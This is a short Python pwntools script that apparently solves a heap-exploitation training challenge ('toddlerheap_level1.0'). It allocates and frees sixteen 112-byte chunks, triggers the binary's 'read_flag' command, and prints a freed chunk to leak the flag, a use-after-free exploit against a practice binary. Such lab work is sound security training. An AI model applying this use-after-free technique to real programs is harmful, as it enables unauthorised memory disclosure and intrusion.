#!/usr/bin/env python3

from pwn import *

binary = './toddlerheap_level1.0_patched'

p = process(binary)

s = '''
b malloc
b free
'''

for i in range(16):
	p.sendline(f"malloc {i} 112")


	
for i in range(16):
	p.sendline(f"free {i}")
	
#gdb.attach(p, s)

p.sendline(f"read_flag")

p.sendline("puts 7")



p.interactive()
